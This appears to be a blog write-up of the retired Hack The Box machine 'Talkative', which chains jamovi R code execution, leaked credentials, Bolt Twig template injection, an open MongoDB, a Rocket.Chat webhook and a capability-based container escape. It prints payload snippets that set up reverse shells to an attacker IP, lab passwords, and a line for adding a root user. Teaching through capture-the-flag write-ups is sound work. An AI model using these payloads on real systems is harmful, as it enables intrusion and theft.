---
layout: post
title: "Five Rooms and a Stolen Key"
subtitle: "HTB Talkative, a chat company built out of nested containers, where every door is a trust someone forgot to revoke"
date: 2022-09-03 12:00:00 +0000
description: "A statistics tool runs your code, a saved file leaks every password, and four containers later a forgotten Linux capability reads the host's secrets through the floorboards."
image: /assets/og/five-rooms-and-a-stolen-key.png
tags: [hackthebox, writeup]
---

Talkative is a company that sells chat software, and the box is built like an office building made of locked rooms inside locked rooms. You start in a statistics app that politely runs any code you type, which drops you into the first container. In that room you find a saved file someone left on the desk, and the file is a ring of keys to every other door. From there it is a walk. A content manager that lets you rewrite its own templates. An SSH login that was waiting for a password you already stole. A database in a back room that never asks who you are. A chat server you talk your way into admin on, then a webhook that runs your code instead of posting a message. Five rooms, and not one lock was picked. Every single door opened because somebody, somewhere, handed out a key and never took it back.

```
        T A L K A T I V E   C O.
        ========================
        jamovi  ──▶  "type some R, i'll run it"   [room 1]
                       |
                       saved .omv on the desk = every password
                       |
        bolt cms ──▶  "edit your own template"    [room 2]
                       |
        ssh     ──▶  log in as saul, key already stolen  [host]
                       |
        mongo   ──▶  back room, no door at all     [room 3]
                       make me an admin. ok.
                       |
        rocket  ──▶  webhook runs code, not chat   [room 4]
                       |
        capability ──▶ read the host through the floor  [escape]
                                                    話
```

## 0x01 · the lobby

`nmap` paints a building with a lot of windows lit up. SSH is filtered from the outside. Apache on 80 hosts the marketing site. Port 3000 is a Rocket.Chat instance, the open-source group chat. And three copies of Tornado, Python's async web server, sit on 8080 through 8082.

```
PORT     STATE    SERVICE   VERSION
22/tcp   filtered ssh
80/tcp   open     http      Apache httpd 2.4.52
3000/tcp open     http      Meteor / Rocket.Chat
8080/tcp open     http      Tornado httpd 5.0
8081/tcp open     http      Tornado httpd 5.0
8082/tcp open     http      Tornado httpd 5.0
```

Only 8080 has anything home, and what lives there is jamovi, a point-and-click statistics tool. The version banner cheerfully announces that it is old and has known security problems, which is the software equivalent of a welcome mat with a key under it. The other oddity worth noting now is that filtered SSH. The front door is locked from the street, but every building this size has a back stair, and we are going to find ours from the inside.

## 0x02 · the calculator that runs anything

jamovi is for crunching numbers, and to crunch numbers it lets you write little scripts in R, the statistics language. That is the entire feature, and that is the entire problem. R has a function called `system()` whose only job is to run an operating-system command. The app puts an R editor in your browser and then faithfully executes whatever you write, including the line that calls out to a shell.

Think of it like a pocket calculator that, somewhere in the manual, mentions it can also dial any phone number you punch in. Nobody reads that far, so nobody removed the dialer. You just type the number.

```r
system("[ bash reverse shell over /dev/tcp back to 10.10.14.4 on 443 ], intern = TRUE)
```

Spell the reverse shell however your listener likes. Start a catcher, run the cell, and a prompt lands in your lap.

```
# nc -lvnp 443
connect to [10.10.14.4] from (UNKNOWN) [172.18.0.2]
id
uid=0(root) gid=0(root)
```

Read the address. Not `10.10.10.x`, the box itself, but `172.18.0.2`, a private Docker address. You did not land on the server. You landed in a small sealed room inside it, the jamovi container, and you are root of a room with nothing in it. Almost nothing.

## 0x03 · the keyring on the desk

A look around the container turns up a file in `/root` named `bolt-administration.omv`. An `.omv` file is a jamovi document, the thing you save when you finish a stats project. It is also, like a surprising number of document formats, just a Zip archive wearing a different extension. Unzip it.

```
# unzip bolt-administration.omv
  inflating: xdata.json
  inflating: ...
```

Inside `xdata.json` is a table someone built to keep track of accounts, and it is exactly what it sounds like. The admin login for the Bolt content manager, plus a column of real people with real passwords.

```
admin                jeO09ufhWD<s
matt@talkative.htb   ...
saul@talkative.htb   )SQWGm>9KHEA
janit@talkative.htb  ...
```

Picture a janitor who, to remember the building's many locks, writes every code on a sticky note and leaves it in a drawer of the first room you wander into. The room itself held nothing of value. The note holds everything. Pocket the whole list. We will spend these one at a time.

## 0x04 · a template that templates back

Apache on 80 runs Bolt, a PHP content management system. The admin password from the keyring logs straight in. Bolt's whole selling point is that admins can edit the site's look, and the way you edit the look is by editing Twig templates. Twig is a templating language, the kind of thing that turns `{{ name }}` into someone's actual name when the page renders.

Here is the trap built into that convenience. A templating engine is, underneath, a tiny programming language. If it will run your `{{ ... }}` to fill in a name, it can be coaxed into running `{{ ... }}` that reaches past names and into the operating system. That is server-side template injection, SSTI, and Bolt hands you the editor for free.

Think of it like a fill-in-the-blank form letter. The blanks are supposed to hold a customer's name and address. But the machine that fills the blanks does not actually understand the difference between "insert the name here" and "insert the result of robbing the safe here." It just follows the bracket. Edit the theme's main template, drop in a payload that hooks an undefined filter to PHP's `exec`, and pipe a command through it.

```
{{ ['[ bash reverse shell back to 10.10.14.4 on 445 ]'] | filter('system') }}
```

Bolt caches compiled templates, so the edit does nothing until you clear the cache from the maintenance menu. Clear it, load the page, and the template renders by running your command instead of printing your text.

```
# nc -lvnp 445
connect from 172.17.0.10
id
uid=33(www-data) gid=33(www-data)
```

A new room. `172.17.0.10`, the Bolt container, this time as the lowly `www-data`. Two containers down, and the building is bigger than the front door let on.

## 0x05 · the back stair

The SSH that was filtered from the street is wide open from inside the building. The Bolt container can reach the real host at `172.17.0.1`, and the keyring from room one had a human on it, `saul`, with a password. People reuse a password across a web login and a system account the way they reuse one key for the front door and the garage.

```
www-data@bolt:/$ ssh saul@172.17.0.1
saul@172.17.0.1's password: )SQWGm>9KHEA
saul@talkative:~$ cat user.txt
████████████████████████████████
```

That is `user.txt`, and more importantly it is a real foothold on the actual machine instead of a sealed container. The stolen note from the very first room just unlocked the host. The keyring keeps paying.

## 0x06 · the back room with no door

From `saul` on the host you can see the building's wiring. There is a second Docker network humming along, and on it sits a MongoDB database at `172.17.0.2:27017`. Mongo is the database behind the Rocket.Chat instance on port 3000, and this Mongo was set up with no authentication at all. Not a weak password. No password. It answers anyone who knocks.

To reach a port that only exists inside the box, tunnel it out to yourself. `chisel` builds a reverse tunnel, like running a long extension cord from a socket inside the locked building out to your van on the curb.

```
# on the host, as saul
$ ./chisel client 10.10.14.4:8000 R:27017:172.17.0.2:27017
```

Now Mongo answers on your own machine. Register an ordinary account in the Rocket.Chat web app first, find your user record in the `meteor` database, and promote yourself.

```
> use meteor
> db.users.update(
    { username: "iceberg" },
    { $set: { roles: ["admin"] } } )
```

You walked into the records room, found your own file, and wrote the word "admin" on it in the company's own ink. Refresh Rocket.Chat and you are looking at the administrator dashboard. The chat server never doubted you, because the database that vouches for everyone never doubted the database next door.

## 0x07 · the webhook that wasn't chatty

Rocket.Chat admins can build integrations, and one kind is an incoming webhook. The idea is friendly. An outside service posts to a URL, and a little snippet of JavaScript you wrote decides how that turns into a chat message. The catch is that the snippet is real JavaScript running on the server, and server-side JavaScript can reach the operating system through Node's module system.

Picture a suggestion box bolted to the wall, where a clerk reads each slip and acts on it. It was built so a slip reading "post "hello" in #general" becomes a friendly message. But the clerk follows any instruction on the slip, so a slip reading "go to the basement and unlock the vault" gets followed just as obediently. The box never decided which instructions were allowed. It only decided to obey.

Write a webhook script that grabs `child_process` and shells out.

```js
const require = console.log.constructor('return process.mainModule.require')();
require('child_process').exec('[ reverse shell back to 10.10.14.4 on 445 ]');
```

Hit the webhook's URL to trigger it, and the shell comes back.

```
# nc -lvnp 445
connect from 172.17.0.3
id
uid=0(root) gid=0(root)
```

Root, but root of yet another room, the Rocket.Chat container at `172.17.0.3`. Five rooms deep now. The last wall is the one between this container and the real host underneath it.

## 0x08 · reading the host through the floorboards

Containers are supposed to be sealed. This one was handed a power it never needed. A quick capability check shows it.

```
root@rocketchat:/# capsh --print | grep Current
Current: ... cap_dac_read_search ...
```

`CAP_DAC_READ_SEARCH` is a Linux superpower that means "ignore file-read permissions." A normal program asks the kernel for a file and the kernel checks whether you are allowed. This capability tells the kernel to skip the check. It cannot edit files, only read any of them, but in a container that is enough, because the host's files are sitting right under your feet.

The classic tool here is shocker. It abuses a syscall, `open_by_handle_at`, that opens a file by a numeric handle instead of a path. Picture a hotel where every room also has a hidden trapdoor to the floor below, and you have a master skeleton key that opens any door you can find a number for. You do not know the room numbers, so you try them in order, one after another, until a door swings open into the host's filesystem. From there you walk to `/etc/passwd`, the file that lists every account, and read it. With write tricks layered on, you slip a brand-new root user into it.

```
iceberg:[hash]:0:0:pwned:/root:/bin/bash
```

SSH back in as that account and you are standing on the actual host as root, five containers and one forgotten capability away from where you started.

```
# cat /root/root.txt
████████████████████████████████
```

## 0x09 · the honest caveat

There is no zero-day on Talkative. There is barely a CVE. Every step is a feature working exactly as designed, used by someone the designer never imagined. The statistics app runs code because running code is the product. The CMS edits templates because editing templates is the product. The webhook runs JavaScript because that is what a webhook is for. None of these is a bug. Each one is a trust, extended generously and never fenced in.

The thread running through all five rooms is the one most worth keeping. A capability you grant and forget is a capability an attacker inherits in full. The Mongo with no password, the SSH account that shared a password with a web login, the container holding a permission it had no reason to hold, the saved file that quietly carried every secret out of the secure room and into the first place anyone would look. Defenders patch CVEs because CVEs come with a date and a number. Nobody schedules a maintenance window to revoke a permission that has not caused a problem yet. So it sits, green and quiet, until the day it is the whole chain. The way out of Talkative is not a faster exploit. It is the discipline to ask, of every key you hand out, who still holds it and whether they should.

## 0x0a · outro

```
five rooms, and you never picked a lock.
a calculator that dialed out. a note left in a drawer.
a template that templated back. a database with no door.
and under the last floor, a key nobody remembered giving away.

trust is a loan. somebody has to call it back in.
revoke the key. fence the capability. wear black.

                                                            EOF
```

---

*HTB: Talkative, retired 27 Aug 2022. A hard Linux box that is really a tour of misplaced trust, container by container, where the only exploit is a permission nobody revoked.*